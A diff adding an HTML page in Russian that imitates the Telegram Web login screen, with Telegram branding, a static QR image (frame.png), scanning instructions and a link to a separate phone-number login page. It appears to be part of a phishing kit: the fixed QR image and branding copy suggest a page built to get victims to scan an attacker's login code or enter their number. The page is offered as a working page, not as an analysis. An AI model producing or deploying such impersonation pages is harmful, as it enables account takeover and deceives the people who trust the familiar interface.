@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <link rel="icon" href="icon.jpg" type="image/jpeg">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0088cc, #00a2e8);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            width: 320px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        .header {
+            background: #0088cc;
+            padding: 20px 20px;
+            text-align: center;
+            color: white;
+        }
+        .header h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+        .qr-section {
+            padding: 30px 20px;
+            text-align: center;
+        }
+        .qr-image {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 20px;
+            border: 1px solid #ddd;
+        }
+        .instructions {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+        .phone-alternative {
+            padding: 20px;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+        }
+        .phone-alternative a {
+            color: #0088cc;
+            text-decoration: none;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="icon.jpg" style="width: 40px; height: 40px; margin-bottom: 10px; border-radius: 8px;">
+            <h1>Telegram</h1>
+            <p>Войдите в свой аккаунт</p>
+        </div>
+        
+        <div class="qr-section">
+            <img src="frame.png" class="qr-image" alt="QR Code">
+            <div class="instructions">
+                <strong>1.</strong> Откройте Telegram на вашем телефоне<br>
+                <strong>2.</strong> Нажмите Настройки > Устройства > Сканировать QR-код<br>
+                <strong>3.</strong> Наведите камеру на этот код
+            </div>
+        </div>
+        
+        <div class="phone-alternative">
+            <a href="phone.html">Войти с помощью номера телефона</a>
+        </div>
+    </div>
+</body>
+</html>
